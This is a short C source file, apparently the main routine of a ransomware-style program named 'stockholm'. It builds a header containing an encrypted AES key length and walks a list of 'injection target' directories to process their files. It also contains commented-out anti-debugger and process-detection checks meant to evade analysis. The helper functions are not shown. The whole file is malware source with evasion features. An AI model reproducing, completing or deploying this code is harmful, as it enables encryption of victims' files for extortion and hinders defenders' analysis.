#include "stockholm.h"

void init_stockholm_header(t_env *env)
{
	// Set the file signature
	memcpy(env->stockhlm_header.signature, SH_SIGNATURE, SH_MAGICNBR_SIZE);
	// Set the size of the encrypted AES key
	env->stockhlm_header.encrypted_key_len = SH_ENCRYPT_KEY_SIZE;
}

int main(int argc, char *argv[])
{
	static t_env	env;

	// Detect first silent mode
	detect_silent_mode(&env, argc, argv);

	// const char *process_name = "zsh";
	// if (pc_is_process_running(process_name)) {
		// if (env.modes & SH_VERBOSE)
	// 	fprintf(stderr, FMT_ERROR " The process '%s' is running. Exiting...\n", process_name);
	// 	return 0;
	// }

	// if (pc_is_debugger_attached())
	// {
	// 	if (env.modes & SH_VERBOSE)
	// 		fprintf(stderr, FMT_ERROR " Debugger detected. Exiting...\n");
	// 	return 0; // Exit if a debugger is detected
	// }

	// Parse the arguments given through the commannd line
	parse_argv(&env, argc, argv);

	// Init the header that will be placed at the top of the file
	init_stockholm_header(&env);

	// Declare the injection target directory paths
	char *target_dir_paths[SH_TARGET_ARRAY_SIZE] = SH_TARGET_PATHS;

	// Open each target directory one by one
	for (size_t i = 0; i < SH_TARGET_ARRAY_SIZE; ++i)
		handle_dir(&env, target_dir_paths[i]);
}
